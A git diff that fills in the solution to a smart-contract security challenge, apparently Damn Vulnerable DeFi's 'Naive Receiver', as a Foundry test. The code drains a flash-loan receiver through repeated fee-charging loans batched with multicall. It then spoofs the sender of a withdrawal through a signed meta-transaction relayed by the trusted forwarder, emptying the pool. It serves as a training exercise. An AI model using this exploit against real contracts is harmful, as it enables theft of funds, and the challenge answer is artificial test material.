@@ -77,7 +77,63 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+        // --- PART 1: Drain the FlashLoanReceiver ---
+        // The FlashLoanReceiver doesn't check who initiated the flash loan.
+        // It blindly pays the 1 WETH fee anytime `onFlashLoan` is called by the pool.
+        // We pack 10 flash loan requests into an array to execute them in a single
+        // transaction using the pool's `multicall` function. This drains its 10 WETH.
+        bytes[] memory callData = new bytes[](10);
+        for (uint256 i = 0; i < 10; i++) {
+            callData[i] = abi.encodeCall(
+                pool.flashLoan,
+                (receiver, address(weth), 0, bytes(""))
+            );
+        }
+        pool.multicall(callData);
+
+        // --- PART 2: Drain the NaiveReceiverPool ---
+        // The pool uses `_msgSender()` to determine whose balance to reduce during a `withdraw`.
+        // If the call comes from the `trustedForwarder`, it trusts the last 20 bytes of `msg.data`
+        // as the actual sender.
+        // Because `pool` inherits `Multicall` (which uses `delegatecall`), if the forwarder 
+        // calls `multicall`, the inner `delegatecall` preserves `msg.sender` as the forwarder, 
+        // but `msg.data` becomes whatever we passed in the array. 
+        // So, we can append the `deployer` address (who owns the deposits) to a `withdraw` call.
+        bytes[] memory withdrawData = new bytes[](1);
+        withdrawData[0] = abi.encodePacked(
+            abi.encodeCall(pool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
+            deployer // Append deployer address to spoof _msgSender()
+        );
         
+        // We wrap our crafted `withdraw` payload inside a `multicall` payload for the forwarder
+        bytes memory multicallData = abi.encodeCall(pool.multicall, (withdrawData));
+
+        // Create the EIP-712 meta-transaction request
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 1000000,
+            nonce: forwarder.nonces(player),
+            data: multicallData,
+            deadline: block.timestamp
+        });
+
+        // Generate the EIP-712 signature using the player's private key
+        bytes32 digest = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                forwarder.getDataHash(request)
+            )
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // Execute the meta-transaction via the forwarder
+        bool success = forwarder.execute(request, signature);
+        require(success, "Forwarder call failed");
     }
 
     /**
